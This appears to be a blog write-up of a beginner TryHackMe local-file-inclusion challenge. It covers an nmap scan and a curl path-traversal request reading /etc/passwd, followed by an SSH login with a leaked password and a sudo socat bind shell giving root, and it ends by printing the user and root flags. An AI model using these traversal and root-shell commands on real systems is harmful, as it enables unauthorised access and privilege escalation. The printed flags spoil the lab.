---
title: "Inclusion"
date: 2020-03-16T18:42:36+01:00
draft: false
tags: ["ctf", "tryhackme", "LFI", "socat"]
---

Hi guys, after long time I have 5 minutes for playing game, so let's play.
I see new game called __Inclusion__ with describe __A beginner level LFI challenge__.
Yes, this is something I want to play and have been done quick.

So I am starting VPN tunnel to our playground and click on magic button __Deploy machine__.

As always first scan ports opened on the machine.
```bash
$ nmap -T4 -sV 10.10.131.100 --top 100                              
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 18:30 CET   
Nmap scan report for 10.10.131.100     
Host is up (0.15s latency).                                                                                                                                   
Not shown: 98 closed ports                                                     
PORT   STATE SERVICE VERSION                                                   
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                                               
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                
Nmap done: 1 IP address (1 host up) scanned in 9.86 seconds         
```

Okay, so some default ports opened. Open the browser, read the articles, we can see, that there is only one parameter
called __name__ of article.

```bash
GET /article?name=lfiattack
...
Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous. An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows.



http://example.com/?file=../../../../etc/passwd
...
```

Okey, so at first we can try the version of LFI in the example. Let's use CLI

```bash
$ curl 'http://10.10.131.100/article?name=../../../../etc/passwd'
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
...
```

It looks like we have password in the comment of the file __/etc/passwd__
- #falconfeast:rootpassword

so let's use __ssh__ with the gained username/password

```bash
$ ssh falconfeast@10.10.131.100                                                                                                                   
The authenticity of host '10.10.131.100 (10.10.131.100)' can't be established.                                                                                
ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.                                                                                  
Are you sure you want to continue connecting (yes/no)? yes                                                                                                    
Warning: Permanently added '10.10.131.100' (ECDSA) to the list of known hosts.
rfalconfeast@10.10.131.100's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 16 23:06:55 IST 2020

  System load:  0.01              Processes:           84
  Usage of /:   34.8% of 9.78GB   Users logged in:     0
  Memory usage: 64%               IP address for eth0: 10.10.131.100
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

3 packages can be updated.
3 updates are security updates.


Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
$ falconfeast@inclusion:~$ ls
articles  user.txt
$ falconfeast@inclusion:~$ cat user.txt 
60989655118397345799
```

In falconfeast's homedir we can find the __user.txt__ file with the flag
__user flag__
- 60989655118397345799

but how to get the __root flag__?
let's look for options

```bash
$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

Okay, we can run __socat__ under root priviledges without password. That's enough for us.

- On remote machine
```bash
$ sudo socat TCP-LISTEN:1111,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane
```

- On local machine
```bash
$ socat FILE:`tty`,raw,echo=0 TCP:10.10.131.100:1111
sh: 0: can't access tty; job control turned off
# pwd
/home/falconfeast
# cd /root
# ls
root.txt
# cat root.txt
42964104845495153909
```

Ou yeah, we have root priviledges! :)
__root flag__
- 42964104845495153909

[socat](https://linux.die.net/man/1/socat) is really strong network utility, I recommend to read more about it.
Have a another nice day with COVID-19.
bye;)
